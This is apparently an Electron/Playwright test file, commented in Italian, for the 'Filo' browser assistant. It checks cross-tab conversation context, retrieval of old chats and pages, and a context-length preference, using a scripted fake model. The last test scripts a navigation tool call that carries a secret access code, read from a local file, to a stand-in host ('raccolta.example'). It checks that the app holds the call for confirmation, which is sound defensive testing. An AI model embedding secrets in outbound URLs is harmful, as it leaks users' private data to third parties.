// #868 — in ogni scheda Filo ha davanti gli ultimi giorni di conversazioni e ritrova da solo i pezzi vecchi.
// Il modello è finto: si guarda cosa gli arriva (ordine dei messaggi, prefisso fra due turni, ricordi in coda) e
// cosa vede l'utente (risposta, blocco di attività, pagina riaperta, conferma chiesta).

import { test, expect } from './fixtures/electron.mjs';
import { cartellaInCasa } from './helpers/percorsi.mjs';
import { writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';

const ORA_MS = 60 * 60 * 1000;

async function newtabs(app) {
  return app.windows().filter((w) => { try { return w.url().startsWith('filo://newtab'); } catch (_) { return false; } });
}

async function primaScheda(app) {
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    const [win] = await newtabs(app);
    if (win) { await win.waitForLoadState('domcontentloaded'); return win; }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('newtab non trovata');
}

// Una scheda nuova: un'altra home, con la sua conversazione.
async function schedaNuova(app, shell) {
  const prima = new Set(await newtabs(app));
  await shell.evaluate(() => window.filoShell.tabs.open('filo://newtab/'));
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    const nuova = (await newtabs(app)).find((w) => !prima.has(w));
    if (nuova) { await nuova.waitForLoadState('domcontentloaded'); return nuova; }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('seconda newtab non trovata');
}

// Modello finto: le risposte della chat escono in ordine da `copione`; i vettori sono parole chiave contate, così
// «il ristorante di Lisbona» è vicino allo scambio sul ristorante di Lisbona e lontano da tutto il resto.
async function preparaModello(app, copione) {
  await app.evaluate(async (_e, copione) => {
    const C = globalThis.SN_CONST;
    await globalThis.SN_STORAGE.updateSettings({
      useDefaultModels: false,
      apiKeys: { openrouter: 'k-test' },
      models: { [C.ACTIONS.FILO_CHAT]: 'deepseek-flash' },
      modelRegistry: globalThis.SN_TEST_MODELS.registry,
    });
    const TEMI = ['lisbona', 'ristorante', 'orche', 'fisica', 'esame', 'gatto', 'briciola', 'taberna'];
    globalThis.SN_PROVIDER_OPENROUTER.embed = async ({ texts }) => ({
      vectors: texts.map((t) => {
        const s = String(t).toLowerCase();
        const v = TEMI.map((w) => (s.includes(w) ? 1 : 0));
        v.push(0.05);
        return v;
      }),
    });
    globalThis.__copione = copione.slice();
    globalThis.__chiamate = [];
    globalThis.SN_PROVIDERS.streamCompleteWithFallback = async ({ attempts, messages, onDelta }) => {
      const base = { model: attempts[0].model, provider: attempts[0].provider, usage: {} };
      const sys = String((messages[0] && messages[0].content) || '');
      if (!sys.startsWith('Sei Filo, un assistente personale')) return { ...base, text: '{}', toolCalls: [], finishReason: 'stop' };
      globalThis.__chiamate.push(JSON.parse(JSON.stringify(messages)));
      const r = globalThis.__copione.shift() || { text: 'ok' };
      if (r.text) { try { onDelta && onDelta(r.text); } catch (_) {} }
      return {
        ...base, text: r.text || '',
        toolCalls: (r.tools || []).map((t, i) => ({ id: `t${globalThis.__chiamate.length}_${i}`, name: t.name, arguments: JSON.stringify(t.args || {}) })),
        reasoningDetails: [], finishReason: r.tools ? 'tool_calls' : 'stop',
      };
    };
  }, copione);
}

// Conversazioni e pagine di giorni fa, scritte nel filo come le avrebbe scritte Filo.
async function semina(app, { chat = [], pagine = [] }) {
  await app.evaluate(async (_e, { chat, pagine, ora }) => {
    const E = globalThis.SN_FILO_EVENTI;
    const T = E.TIPI;
    const ev = [];
    const ts = (oreFa, piu = 0) => new Date(ora - oreFa * 3600000 + piu).toISOString();
    for (const c of chat) {
      ev.push(E.crea(T.CHAT_APERTA, { chat: c.id }, { ts: ts(c.oreFa), dispositivo: 'prova', autore: 'utente' }));
      c.scambi.forEach(([u, f], i) => {
        ev.push(E.crea(T.MESSAGGIO, { chat: c.id, msg: { role: 'user', text: u } }, { ts: ts(c.oreFa, i * 60000 + 1000), dispositivo: 'prova', autore: 'utente' }));
        ev.push(E.crea(T.MESSAGGIO, { chat: c.id, msg: { role: 'filo', text: f } }, { ts: ts(c.oreFa, i * 60000 + 5000), dispositivo: 'prova', autore: 'filo' }));
      });
      ev.push(E.crea(T.CHAT_CHIUSA, { chat: c.id }, { ts: ts(c.oreFa, 3600000), dispositivo: 'prova', autore: 'utente' }));
      if (c.titolo) ev.push(E.crea(T.CHAT_TITOLO, { chat: c.id, title: c.titolo, kind: 'conversazione' }, { ts: ts(c.oreFa, 3600000), dispositivo: 'prova', autore: 'filo' }));
    }
    for (const p of pagine) ev.push(E.crea(T.NAVIGAZIONE, { url: p.url, titolo: p.titolo }, { ts: ts(p.oreFa), dispositivo: 'prova', autore: 'utente' }));
    await globalThis.SN_IL_FILO.importa(ev.map(E.riga).join(''));
  }, { chat, pagine, ora: Date.now() });
}

async function scrivi(page, testo) {
  await page.locator('#input').fill(testo);
  await page.locator('#sendBtn').click();
}

const chiamate = (app) => app.evaluate(() => globalThis.__chiamate);
const testo = (m) => (typeof m.content === 'string' ? m.content : JSON.stringify(m.content));
const posContesto = (msgs) => msgs.findIndex((m) => m.role === 'user' && testo(m).startsWith('═══ CONTESTO DI ADESSO'));

test('in una scheda nuova Filo ha davanti quello che hai detto nell\'altra, e due turni di fila hanno lo stesso prefisso', async ({ app, shell }) => {
  test.setTimeout(90_000);
  const a = await primaScheda(app);
  await preparaModello(app, [
    { text: 'In bocca al lupo!' },
    { text: 'Domani: me l\'hai detto nell\'altra scheda.' },
    { text: 'L\'ora non me l\'hai detta.' },
  ]);
  await scrivi(a, 'domani ho l\'esame di fisica');
  await expect(a.locator('.dash-bubble-filo', { hasText: 'In bocca al lupo!' })).toBeVisible({ timeout: 15_000 });

  const b = await schedaNuova(app, shell);
  await expect(b.locator('#input')).toBeVisible();
  await scrivi(b, 'quando ho l\'esame?');
  await expect(b.locator('.dash-bubble-filo', { hasText: 'Domani: me l\'hai detto' })).toBeVisible({ timeout: 15_000 });
  await scrivi(b, 'e a che ora?');
  await expect(b.locator('.dash-bubble-filo', { hasText: 'L\'ora non me l\'hai detta.' })).toBeVisible({ timeout: 15_000 });

  const [, primo, secondo] = await chiamate(app);
  // Il messaggio dell'altra scheda è nel filo davanti al modello, prima del contesto di adesso e della domanda.
  const k = posContesto(primo);
  expect(k).toBeGreaterThan(0);
  const esame = primo.findIndex((m) => /domani ho l'esame di fisica/.test(testo(m)));
  expect(esame).toBeGreaterThan(0);
  expect(esame).toBeLessThan(k);
  expect(testo(primo[esame])).toMatch(/^\[\w{3} \d+ \w{3} \d{4}, \d\d:\d\d · chat \w{4}\]/);
  expect(testo(primo[primo.length - 1])).toBe('quando ho l\'esame?');
  expect(primo[0].role).toBe('system');
  expect(testo(primo[0])).not.toContain('STATO:');
  expect(testo(primo[k])).toContain('STATO:');
  // Il turno dopo nella stessa scheda ripete identico tutto quello che stava prima del contesto: la cache lo riusa.
  expect(secondo.slice(0, k)).toEqual(primo.slice(0, k));
  expect(testo(secondo[k])).toMatch(/quando ho l'esame\?$/);
  expect(posContesto(secondo)).toBe(k + 2);
});

test('una conversazione di cinque giorni fa non è davanti, ma «riprendi la discussione sulle orche» la ritrova e il blocco lo dice', async ({ app }) => {
  test.setTimeout(90_000);
  const page = await primaScheda(app);
  await semina(app, { chat: [{ id: 'orche-di-lunedi', oreFa: 5 * 24, titolo: 'Le orche', scambi: [['parliamo delle orche', 'Le orche sono delfini, non balene.']] }] });
  await preparaModello(app, [
    { text: 'Cerco.', tools: [{ name: 'CERCA_CHAT', args: { query: 'orche' } }] },
    { text: 'Avevamo detto che le orche sono delfini.' },
  ]);
  await scrivi(page, 'riprendi la discussione sulle orche');
  await expect(page.locator('.dash-bubble-filo', { hasText: 'le orche sono delfini' })).toBeVisible({ timeout: 15_000 });

  const [primo, secondo] = await chiamate(app);
  const k = posContesto(primo);
  expect(primo.slice(0, k).some((m) => /delfini/.test(testo(m)))).toBe(false);
  const esito = secondo.find((m) => m.role === 'tool');
  expect(testo(esito)).toContain('Le orche sono delfini, non balene.');
  expect(testo(esito)).toContain('orche-di-lunedi');
  const blocco = page.locator('.dash-activity');
  await blocco.locator('.dash-activity-head').click();
  await expect(blocco.locator('.dash-activity-row', { hasText: 'Cerco nel filo: orche' })).toHaveCount(1);
});

test('una domanda legata a un tratto vecchio lo porta in coda al contesto, e il blocco di attività lo dice', async ({ app }) => {
  test.setTimeout(90_000);
  const page = await primaScheda(app);
  await semina(app, {
    chat: [
      { id: 'viaggio-lisbona', oreFa: 6 * 24, titolo: 'Viaggio a Lisbona', scambi: [['segnati il ristorante di Lisbona: Taberna da Rua', 'Fatto, il ristorante è Taberna da Rua.']] },
      { id: 'altro-vecchio', oreFa: 7 * 24, scambi: [['che tempo fa a Roma?', 'Sole.']] },
    ],
  });
  await preparaModello(app, [{ text: 'Si chiamava Taberna da Rua.' }]);
  await scrivi(page, 'come si chiamava il ristorante di Lisbona?');
  await expect(page.locator('.dash-bubble-filo', { hasText: 'Si chiamava Taberna da Rua.' })).toBeVisible({ timeout: 15_000 });

  const [primo] = await chiamate(app);
  const k = posContesto(primo);
  expect(k).toBe(primo.length - 2);
  expect(testo(primo[k])).toContain('RICORDI DAL FILO');
  expect(testo(primo[k])).toContain('Taberna da Rua');
  expect(testo(primo[k])).not.toContain('che tempo fa a Roma');
  expect(primo.slice(0, k).some((m) => /Taberna/.test(testo(m)))).toBe(false);
  const blocco = page.locator('.dash-activity');
  await blocco.locator('.dash-activity-head').click();
  await expect(blocco.locator('.dash-activity-row', { hasText: 'Ricordato dal filo' })).toContainText('Viaggio a Lisbona');
});

test('«quella pagina sulle orche che ho chiuso ieri»: la ricerca la trova nel filo e la riapre', async ({ app, testServer }) => {
  test.setTimeout(90_000);
  const page = await primaScheda(app);
  const url = testServer.html('<!doctype html><title>Orche - Wikipedia</title><h1>Orche</h1>');
  await semina(app, { pagine: [{ url, titolo: 'Orche - Wikipedia', oreFa: 20 }, { url: testServer.html('<title>Meteo</title>'), titolo: 'Meteo', oreFa: 19 }] });
  await preparaModello(app, [
    { text: '', tools: [{ name: 'CERCA_CHAT', args: { query: 'orche' } }] },
    { text: '', tools: [{ name: 'NAVIGA', args: { url } }] },
    { text: 'Riaperta.' },
  ]);
  await scrivi(page, 'riapri quella pagina sulle orche che ho chiuso ieri');
  await expect(page.locator('.dash-bubble-filo', { hasText: 'Riaperta.' })).toBeVisible({ timeout: 15_000 });
  const [, secondo] = await chiamate(app);
  const esito = testo(secondo.find((m) => m.role === 'tool'));
  expect(esito).toContain(url);
  expect(esito).toContain('Orche - Wikipedia');
  expect(esito).not.toContain('Meteo');
  // Aperta davvero, senza chiedere conferma: è un indirizzo che la ricerca ha appena ritrovato.
  await expect.poll(() => app.windows().some((w) => { try { return w.url() === url; } catch (_) { return false; } }), { timeout: 10_000 }).toBe(true);
});

test('col tetto a un giorno in Preferenze avanzate il contesto si accorcia al turno dopo', async ({ app, openTab }) => {
  test.setTimeout(90_000);
  const page = await primaScheda(app);
  await semina(app, { chat: [{ id: 'gatto-ieri', oreFa: 30, scambi: [['il mio gatto si chiama Briciola', 'Bel nome!']] }] });
  await preparaModello(app, [{ text: 'Uno.' }, { text: 'Due.' }]);
  await scrivi(page, 'che giorno è oggi?');
  await expect(page.locator('.dash-bubble-filo', { hasText: 'Uno.' })).toBeVisible({ timeout: 15_000 });

  const pref = await openTab('filo://preferences/preferences.html');
  await expect(pref.locator('#contestoGiorni')).toHaveAttribute('placeholder', '3');
  await pref.locator('#contestoGiorni').fill('1');
  await pref.locator('#contestoGiorni').dispatchEvent('change');
  await expect.poll(() => app.evaluate(async () => (await globalThis.SN_STORAGE.getSettings()).contestoFilo.giorni)).toBe(1);

  await page.bringToFront();
  await scrivi(page, 'e domani?');
  await expect(page.locator('.dash-bubble-filo', { hasText: 'Due.' })).toBeVisible({ timeout: 15_000 });
  const [primo, secondo] = await chiamate(app);
  const prima = (msgs) => msgs.slice(0, posContesto(msgs)).map(testo).join('\n');
  expect(prima(primo)).toContain('Briciola');
  expect(prima(secondo)).not.toContain('Briciola');
  expect(prima(secondo)).toContain('che giorno è oggi?');
});

test('documento letto in una scheda: in un\'altra un link con un suo pezzo chiede conferma', async ({ app }) => {
  test.setTimeout(90_000);
  await primaScheda(app);
  const casa = cartellaInCasa('filo-contesto-');
  const doc = join(casa, 'prenotazione.txt');
  writeFileSync(doc, 'Prenotazione confermata. Codice di accesso: QX7MZ4K9PL2W. Non condividerlo.');
  try {
    await preparaModello(app, [
      { text: '', tools: [{ name: 'LEGGI_DOCUMENTO', args: { percorso: doc } }] },
      { text: 'Ho letto la prenotazione.' },
      { text: '', tools: [{ name: 'NAVIGA', args: { url: 'https://raccolta.example/c?d=QX7MZ4K9PL2W' } }] },
      { text: 'Fatto.' },
    ]);
    const a = await app.evaluate((_e, doc) => globalThis.SN_HANDLE_FILO_CHAT({ userMessage: `leggi ${doc}`, threadHistory: [], chatId: 'scheda-a' }), doc);
    expect(a.actions.find((x) => x.type === 'LEGGI_DOCUMENTO')._executed).toBe(true);
    const b = await app.evaluate(() => globalThis.SN_HANDLE_FILO_CHAT({ userMessage: 'apri il sito delle prenotazioni', threadHistory: [], chatId: 'scheda-b' }));
    const naviga = b.actions.find((x) => x.type === 'NAVIGA');
    expect(naviga._executed).toBe(false);
    expect(naviga._confirm && naviga._confirm.level).toBe(2);
    // E il contesto della seconda scheda aveva davvero la lettura della prima: è per questo che chiede.
    const [, , terzo] = await chiamate(app);
    expect(terzo.map(testo).join('\n')).toContain('QX7MZ4K9PL2W');
  } finally {
    rmSync(casa, { recursive: true, force: true });
  }
});
